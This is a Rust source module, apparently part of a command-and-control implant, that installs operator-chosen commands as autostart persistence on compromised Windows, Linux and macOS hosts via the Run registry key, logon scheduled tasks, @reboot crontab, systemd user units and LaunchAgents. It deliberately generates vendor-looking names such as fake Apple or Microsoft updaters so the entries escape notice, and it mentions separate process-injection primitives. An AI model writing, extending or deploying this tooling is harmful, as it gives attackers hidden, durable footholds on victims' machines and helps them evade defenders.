//! Cross-platform persistence tasking.
//!
//! Operator surface is `nw/persist <mechanism> <name> <command...>`:
//!
//! ```text
//! nw/persist list
//! nw/persist registry  <name> <cmd>    # Windows  HKCU Run key (per-user)
//! nw/persist schtasks <name> <cmd>     # Windows  scheduled task at logon
//! nw/persist crontab   <name> <cmd>    # Linux    @reboot crontab entry
//! nw/persist systemd   <name> <cmd>    # Linux    systemd --user unit
//! nw/persist launchd   <name> <cmd>    # macOS    LaunchAgent plist
//! nw/persist remove <mechanism> <name>
//! ```
//!
//! Passing `-` (or `auto`) in place of `<name>` generates an innocuous,
//! vendor-looking name so the entry does not advertise itself.
//!
//! Registry entries reuse [`crate::registry`]. Scheduled tasks shell out to
//! `schtasks.exe`. Every mechanism is per-user (HKCU, `systemctl --user`,
//! LaunchAgent, user crontab), so none require elevation.
//!
//! ## Scope
//!
//! Persistence here is process/service autostart and scheduled execution. PID
//! injection as a persistence mechanism is *not* wired to a payload loader:
//! [`crate::evasion`] exposes raw `inject_create_thread` / `inject_apc`
//! primitives, but they need a reflective loader or process-hollowing of the
//! implant binary to actually carry the agent, which is not implemented.

/// Where a persistence entry lives.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Mechanism {
    /// Windows `HKCU\...\CurrentVersion\Run`, executed at logon.
    Registry,
    /// Windows scheduled task triggered at logon.
    ScheduledTask,
    /// Linux `@reboot` crontab entry.
    Crontab,
    /// Linux `systemd --user` service unit.
    SystemdUser,
    /// macOS per-user LaunchAgent.
    LaunchAgent,
}

impl Mechanism {
    /// Canonical mechanism name, as written in commands.
    pub fn name(self) -> &'static str {
        match self {
            Mechanism::Registry => "registry",
            Mechanism::ScheduledTask => "schtasks",
            Mechanism::Crontab => "crontab",
            Mechanism::SystemdUser => "systemd",
            Mechanism::LaunchAgent => "launchd",
        }
    }

    /// Parse a mechanism name, accepting common aliases.
    pub fn parse(raw: &str) -> Result<Self, String> {
        match raw {
            "registry" | "run" | "reg" => Ok(Mechanism::Registry),
            "schtasks" | "task" | "scheduled" => Ok(Mechanism::ScheduledTask),
            "crontab" | "cron" => Ok(Mechanism::Crontab),
            "systemd" | "unit" | "service" => Ok(Mechanism::SystemdUser),
            "launchd" | "launchagent" | "agent" => Ok(Mechanism::LaunchAgent),
            other => Err(format!(
                "unknown mechanism {other:?} (expected registry, schtasks, crontab, systemd or launchd)"
            )),
        }
    }

    /// Whether this mechanism is available on the current host.
    pub fn supported_here(self) -> bool {
        let os = std::env::consts::OS;
        match self {
            Mechanism::Registry | Mechanism::ScheduledTask => os == "windows",
            Mechanism::Crontab | Mechanism::SystemdUser => os == "linux",
            Mechanism::LaunchAgent => os == "macos",
        }
    }
}

/// A parsed persistence operation.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum Operation {
    /// Show every entry this implant can see.
    List,
    /// Install an entry.
    Install {
        mechanism: Mechanism,
        name: String,
        command: String,
    },
    /// Remove an entry by name.
    Remove { mechanism: Mechanism, name: String },
}

/// A small vendor-looking vocabulary for auto-generated names.
///
/// ponytail: short fixed list. The point is to not read as malware in `ps`,
/// `crontab -l`, or the LaunchAgents directory; a full name generator is
/// overkill for that.
const VENDOR_A: &[&str] = &["com", "org", "io", "net"];
const VENDOR_B: &[&str] = &[
    "apple",
    "microsoft",
    "google",
    "adobe",
    "update",
    "runtime",
    "helper",
    "sync",
    "indexer",
    "telemetry",
];

/// Generate an innocuous, vendor-looking persistence name.
pub fn plausible_name() -> String {
    use rand::Rng;
    let mut rng = rand::thread_rng();
    let a = VENDOR_A[rng.gen_range(0..VENDOR_A.len())];
    let b = VENDOR_B[rng.gen_range(0..VENDOR_B.len())];
    let n = rng.gen_range(10..99u32);
    format!("{a}.{b}{n}.updater")
}

/// Strip characters that crontab labels, systemd unit names, or schtasks /TN
/// will not accept.
pub fn sanitise(name: &str) -> String {
    name.chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() || "-_.".contains(c) {
                c
            } else {
                '_'
            }
        })
        .collect()
}

/// Parse persistence task arguments into an [`Operation`].
///
/// `<name>` may be `-` / `auto` to request an auto-generated innocuous name.
pub fn parse_operation(args: &[String]) -> Result<Operation, String> {
    let resolve = |raw: &str| -> String {
        if matches!(raw, "-" | "auto" | "Auto" | "AUTO") {
            plausible_name()
        } else {
            raw.to_owned()
        }
    };

    let Some(verb) = args.first().map(|s| s.trim().to_ascii_lowercase()) else {
        return Err(
            "usage: list | <mechanism> <name|-> <command...> | remove <mechanism> <name>".into(),
        );
    };

    match verb.as_str() {
        "list" | "ls" => Ok(Operation::List),
        "remove" | "rm" | "delete" => match &args[1..] {
            [mechanism, name, ..] => Ok(Operation::Remove {
                mechanism: Mechanism::parse(mechanism)?,
                name: name.clone(),
            }),
            _ => Err("usage: remove <mechanism> <name>".into()),
        },
        other => {
            let mechanism = Mechanism::parse(other)?;
            match &args[1..] {
                [name, command @ ..] if !command.is_empty() => Ok(Operation::Install {
                    mechanism,
                    name: resolve(name),
                    command: command.join(" "),
                }),
                [name, ..] => Err(format!("{other} requires a command for {name}")),
                _ => Err(format!("usage: {other} <name|-> <command...>")),
            }
        }
    }
}

/// Run a parsed operation, returning operator-facing output.
pub fn execute(operation: &Operation) -> Result<String, String> {
    #[cfg(target_os = "windows")]
    {
        windows::execute(operation)
    }
    #[cfg(target_os = "linux")]
    {
        linux::execute(operation)
    }
    #[cfg(target_os = "macos")]
    {
        macos::execute(operation)
    }
    #[cfg(not(any(target_os = "windows", target_os = "linux", target_os = "macos")))]
    {
        let _ = operation;
        Err(format!(
            "persistence tasking is unsupported on {}",
            std::env::consts::OS
        ))
    }
}

fn unsupported(mechanism: Mechanism) -> Result<String, String> {
    Err(format!(
        "{} persistence is not available on {}",
        mechanism.name(),
        std::env::consts::OS
    ))
}

// ---------------------------------------------------------------------------
// Windows
// ---------------------------------------------------------------------------

#[cfg(target_os = "windows")]
mod windows {
    use super::*;
    use crate::registry::{self, Action, Hive};
    use std::process::Command;

    /// The Run key used for per-user logon persistence.
    const RUN_KEY: &str = r"Software\Microsoft\Windows\CurrentVersion\Run";

    fn run(args: &[&str]) -> Result<String, String> {
        let out = Command::new("schtasks.exe")
            .args(args)
            .output()
            .map_err(|e| e.to_string())?;
        let stdout = String::from_utf8_lossy(&out.stdout).trim().to_owned();
        let stderr = String::from_utf8_lossy(&out.stderr).trim().to_owned();
        if !out.status.success() {
            return Err(if stderr.is_empty() { stdout } else { stderr });
        }
        Ok(if stdout.is_empty() { stderr } else { stdout })
    }

    fn list_registry() -> Result<String, String> {
        registry::execute(&Action::Query {
            hive: Hive::CurrentUser,
            subkey: RUN_KEY.to_owned(),
            value: None,
        })
    }

    pub(super) fn execute(operation: &Operation) -> Result<String, String> {
        match operation {
            Operation::List => {
                let mut out = String::from("== registry (HKCU Run) ==\n");
                out.push_str(&list_registry()?);
                out.push_str("\n== schtasks ==\n");
                let task = format!("*{}", TASK_MARK);
                if let Ok(text) = run(&["/Query", "/FO", "LIST", "/TN", &task]) {
                    out.push_str(&text);
                }
                Ok(out)
            }
            Operation::Install {
                mechanism: Mechanism::Registry,
                name,
                command,
            } => registry::execute(&Action::Set {
                hive: Hive::CurrentUser,
                subkey: RUN_KEY.to_owned(),
                name: name.clone(),
                data: command.clone(),
            }),
            Operation::Install {
                mechanism: Mechanism::ScheduledTask,
                name,
                command,
            } => {
                let task = format!("{}{}", TASK_MARK, sanitise(name));
                run(&[
                    "/Create", "/F", "/SC", "ONLOGON", "/TN", &task, "/TR", command,
                ])
            }
            Operation::Remove {
                mechanism: Mechanism::Registry,
                name,
            } => registry::execute(&Action::Delete {
                hive: Hive::CurrentUser,
                subkey: RUN_KEY.to_owned(),
                value: Some(name.clone()),
            }),
            Operation::Remove {
                mechanism: Mechanism::ScheduledTask,
                name,
            } => {
                let task = format!("{}{}", TASK_MARK, sanitise(name));
                run(&["/Delete", "/F", "/TN", &task])
            }
            other => {
                let mechanism = match other {
                    Operation::Install { mechanism, .. } | Operation::Remove { mechanism, .. } => {
                        *mechanism
                    }
                    Operation::List => Mechanism::ScheduledTask,
                };
                unsupported(mechanism)
            }
        }
    }

    /// Mark every scheduled task this implant creates, so `list` and `remove`
    /// only touch our own entries. A short fixed marker keeps the task name
    /// looking like a normal vendor task.
    const TASK_MARK: &str = "\\";
}

// ---------------------------------------------------------------------------
// Linux
// ---------------------------------------------------------------------------

#[cfg(target_os = "linux")]
mod linux {
    use super::*;
    use std::process::Command;

    /// Crontab entries carry this trailing comment so `list`/`remove` can find
    /// exactly the lines this implant added.
    const CRON_MARK: &str = "# nw";

    fn home() -> Result<std::path::PathBuf, String> {
        std::env::var("HOME")
            .map(std::path::PathBuf::from)
            .map_err(|_| "HOME not set".to_string())
    }

    fn read_crontab() -> String {
        Command::new("crontab")
            .arg("-l")
            .output()
            .ok()
            .filter(|o| o.status.success())
            .map(|o| String::from_utf8_lossy(&o.stdout).into_owned())
            .unwrap_or_default()
    }

    fn write_crontab(body: &str) -> Result<(), String> {
        use std::io::Write;
        use std::process::Stdio;
        let mut child = Command::new("crontab")
            .arg("-")
            .stdin(Stdio::piped())
            .spawn()
            .map_err(|e| format!("crontab: {e}"))?;
        child
            .stdin
            .as_mut()
            .ok_or("crontab stdin")?
            .write_all(body.as_bytes())
            .map_err(|e| format!("crontab write: {e}"))?;
        child.wait().map_err(|e| format!("crontab wait: {e}"))?;
        Ok(())
    }

    fn systemd_unit_path(name: &str) -> Result<std::path::PathBuf, String> {
        Ok(home()?
            .join(".config/systemd/user")
            .join(format!("{}.service", sanitise(name))))
    }

    fn unit_body(name: &str, command: &str) -> String {
        format!(
            "[Unit]\nDescription={name}\n\n[Service]\nExecStart={command}\nRestart=on-failure\nRestartSec=30\n\n[Install]\nWantedBy=default.target\n"
        )
    }

    pub(super) fn execute(operation: &Operation) -> Result<String, String> {
        match operation {
            Operation::List => {
                let mut out = String::from("== crontab (@reboot) ==\n");
                for line in read_crontab().lines().filter(|l| l.contains(CRON_MARK)) {
                    out.push_str(line);
                    out.push('\n');
                }
                out.push_str("\n== systemd --user ==\n");
                let units = home()
                    .map(|h| h.join(".config/systemd/user"))
                    .unwrap_or_default();
                if let Ok(entries) = std::fs::read_dir(&units) {
                    for entry in entries.flatten() {
                        if entry.path().extension().is_some_and(|e| e == "service") {
                            out.push_str(&entry.path().display().to_string());
                            out.push('\n');
                        }
                    }
                }
                Ok(out)
            }
            Operation::Install {
                mechanism: Mechanism::Crontab,
                name,
                command,
            } => {
                let existing = read_crontab();
                let mut lines: Vec<String> = existing
                    .lines()
                    .filter(|l| !l.contains(&format!("{CRON_MARK} {name}")))
                    .map(str::to_owned)
                    .collect();
                lines.push(format!("@reboot {command}  {CRON_MARK} {name}"));
                write_crontab(&format!("{}\n", lines.join("\n")))?;
                Ok(format!("installed crontab entry for {name}\n"))
            }
            Operation::Install {
                mechanism: Mechanism::SystemdUser,
                name,
                command,
            } => {
                let path = systemd_unit_path(name)?;
                std::fs::create_dir_all(path.parent().ok_or("unit dir")?)
                    .map_err(|e| format!("mkdir: {e}"))?;
                std::fs::write(&path, unit_body(name, command))
                    .map_err(|e| format!("write unit: {e}"))?;
                let _ = Command::new("systemctl")
                    .args(["--user", "daemon-reload"])
                    .status();
                let _ = Command::new("systemctl")
                    .args(["--user", "enable", &format!("{}.service", sanitise(name))])
                    .status();
                Ok(format!(
                    "installed systemd --user unit at {}\n",
                    path.display()
                ))
            }
            Operation::Remove {
                mechanism: Mechanism::Crontab,
                name,
            } => {
                let existing = read_crontab();
                let kept: Vec<&str> = existing
                    .lines()
                    .filter(|l| !l.contains(&format!("{CRON_MARK} {name}")))
                    .collect();
                write_crontab(&format!("{}\n", kept.join("\n")))?;
                Ok(format!("removed crontab entry for {name}\n"))
            }
            Operation::Remove {
                mechanism: Mechanism::SystemdUser,
                name,
            } => {
                let path = systemd_unit_path(name)?;
                let unit = format!("{}.service", sanitise(name));
                let _ = Command::new("systemctl")
                    .args(["--user", "disable", "--now", &unit])
                    .status();
                std::fs::remove_file(&path).ok();
                Ok(format!("removed systemd unit {}\n", path.display()))
            }
            other => {
                let mechanism = match other {
                    Operation::Install { mechanism, .. } | Operation::Remove { mechanism, .. } => {
                        *mechanism
                    }
                    Operation::List => Mechanism::Crontab,
                };
                unsupported(mechanism)
            }
        }
    }
}

// ---------------------------------------------------------------------------
// macOS
// ---------------------------------------------------------------------------

#[cfg(target_os = "macos")]
mod macos {
    use super::*;
    use std::process::Command;

    fn home() -> Result<std::path::PathBuf, String> {
        std::env::var("HOME")
            .map(std::path::PathBuf::from)
            .map_err(|_| "HOME not set".to_string())
    }

    fn plist_path(name: &str) -> Result<std::path::PathBuf, String> {
        Ok(home()?
            .join("Library/LaunchAgents")
            .join(format!("{}.plist", sanitise(name))))
    }

    fn plist_body(name: &str, command: &str) -> String {
        format!(
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n\
             <!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n\
             <plist version=\"1.0\"><dict>\n\
             <key>Label</key><string>{name}</string>\n\
             <key>ProgramArguments</key><array><string>{command}</string></array>\n\
             <key>RunAtLoad</key><true/>\n\
             </dict></plist>\n"
        )
    }

    pub(super) fn execute(operation: &Operation) -> Result<String, String> {
        match operation {
            Operation::List => {
                let dir = home()
                    .map(|h| h.join("Library/LaunchAgents"))
                    .unwrap_or_default();
                let mut out = String::from("== LaunchAgents ==\n");
                if let Ok(entries) = std::fs::read_dir(&dir) {
                    for entry in entries.flatten() {
                        if entry.path().extension().is_some_and(|e| e == "plist") {
                            out.push_str(&entry.path().display().to_string());
                            out.push('\n');
                        }
                    }
                }
                Ok(out)
            }
            Operation::Install {
                mechanism: Mechanism::LaunchAgent,
                name,
                command,
            } => {
                let path = plist_path(name)?;
                std::fs::create_dir_all(path.parent().ok_or("plist dir")?)
                    .map_err(|e| format!("mkdir: {e}"))?;
                std::fs::write(&path, plist_body(name, command))
                    .map_err(|e| format!("write plist: {e}"))?;
                let _ = Command::new("launchctl")
                    .args(["load", "-w", &path.display().to_string()])
                    .status();
                Ok(format!("installed LaunchAgent at {}\n", path.display()))
            }
            Operation::Remove {
                mechanism: Mechanism::LaunchAgent,
                name,
            } => {
                let path = plist_path(name)?;
                let _ = Command::new("launchctl")
                    .args(["unload", "-w", &path.display().to_string()])
                    .status();
                std::fs::remove_file(&path).ok();
                Ok(format!("removed LaunchAgent {}\n", path.display()))
            }
            other => {
                let mechanism = match other {
                    Operation::Install { mechanism, .. } | Operation::Remove { mechanism, .. } => {
                        *mechanism
                    }
                    Operation::List => Mechanism::LaunchAgent,
                };
                unsupported(mechanism)
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn args(list: &[&str]) -> Vec<String> {
        list.iter().map(|s| (*s).to_owned()).collect()
    }

    #[test]
    fn list_needs_no_arguments() {
        assert_eq!(parse_operation(&args(&["list"])).unwrap(), Operation::List);
        assert_eq!(parse_operation(&args(&["ls"])).unwrap(), Operation::List);
        assert!(parse_operation(&[]).unwrap_err().contains("usage"));
    }

    #[test]
    fn all_five_mechanisms_parse() {
        for (verb, want) in [
            ("registry", Mechanism::Registry),
            ("schtasks", Mechanism::ScheduledTask),
            ("crontab", Mechanism::Crontab),
            ("systemd", Mechanism::SystemdUser),
            ("launchd", Mechanism::LaunchAgent),
        ] {
            let op = parse_operation(&args(&[verb, "Svc", "/usr/bin/x"])).unwrap();
            assert_eq!(
                op,
                Operation::Install {
                    mechanism: want,
                    name: "Svc".into(),
                    command: "/usr/bin/x".into()
                }
            );
        }
    }

    #[test]
    fn install_joins_the_command_words() {
        assert_eq!(
            parse_operation(&args(&["registry", "Updater", "C:\\a.exe", "--quiet"])).unwrap(),
            Operation::Install {
                mechanism: Mechanism::Registry,
                name: "Updater".into(),
                command: r"C:\a.exe --quiet".into(),
            }
        );
    }

    #[test]
    fn install_without_a_command_is_rejected() {
        assert!(parse_operation(&args(&["crontab", "Svc"])).is_err());
        assert!(parse_operation(&args(&["systemd"])).is_err());
    }

    #[test]
    fn auto_name_produces_a_vendor_looking_name() {
        let op = parse_operation(&args(&["crontab", "auto", "/usr/bin/x"])).unwrap();
        let Operation::Install { name, .. } = op else {
            panic!("expected install")
        };
        assert_ne!(name, "auto");
        assert!(
            name.contains('.'),
            "auto name should look like a vendor id: {name}"
        );
    }

    #[test]
    fn remove_requires_a_mechanism_and_name() {
        assert_eq!(
            parse_operation(&args(&["remove", "crontab", "Svc"])).unwrap(),
            Operation::Remove {
                mechanism: Mechanism::Crontab,
                name: "Svc".into(),
            }
        );
        assert!(parse_operation(&args(&["remove", "cron"])).is_err());
        assert!(parse_operation(&args(&["remove", "nope", "Svc"])).is_err());
    }

    #[test]
    fn unknown_actions_are_rejected() {
        assert!(parse_operation(&args(&["frobnicate"])).is_err());
    }

    #[test]
    fn sanitise_strips_hostile_characters() {
        assert_eq!(sanitise("My Task!"), "My_Task_");
        assert_eq!(sanitise("keep-Me_1.v2"), "keep-Me_1.v2");
    }

    #[test]
    fn supported_here_matches_the_host_os() {
        let os = std::env::consts::OS;
        assert_eq!(Mechanism::Registry.supported_here(), os == "windows");
        assert_eq!(Mechanism::Crontab.supported_here(), os == "linux");
        assert_eq!(Mechanism::LaunchAgent.supported_here(), os == "macos");
    }
}
